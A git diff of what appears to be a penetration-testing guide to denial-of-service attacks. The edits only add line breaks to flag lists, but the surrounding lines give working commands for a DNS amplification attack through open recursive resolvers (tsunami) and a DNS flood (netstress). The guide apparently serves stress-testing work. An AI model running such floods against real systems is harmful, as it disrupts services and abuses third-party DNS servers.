@@ -89,11 +89,11 @@ Then it's possible to attack the target with using these DNS Servers as an ampli
 
 `./tsunami -s TARGET_IP -n pentest.blog -p 3 -f recursive_dns.txt`
 
-Where 
-`-s` is the target IP address
-`-n` optional doman name to probe
-`-f` the open recursive DNS servers file for the attack
-`-p` number of packets to be sent per DNS server
+Where <br/>
+`-s` is the target IP address <br/>
+`-n` optional doman name to probe <br/>
+`-f` the open recursive DNS servers file for the attack <br/>
+`-p` number of packets to be sent per DNS server <br/>
 
 ## HTTP Flood
 
@@ -113,11 +113,11 @@ You will need <a href="https://sourceforge.net/projects/netstressng/">netstress<
 
 `netstress.fullrandom -d TARGET_DNS_SERVER -a dns -t a -n 4 -P 53`
 
-Where
-`-d` is the destination address
-`-a` is the type of attack
-`-t` is the type of DNS query
-`-n` is the number of processes
+Where: <br/>
+`-d` is the destination address <br/>
+`-a` is the type of attack <br/>
+`-t` is the type of DNS query <br/>
+`-n` is the number of processes <br/>
 `-P` is the destination port
 
 ## Low and Slow Attacks
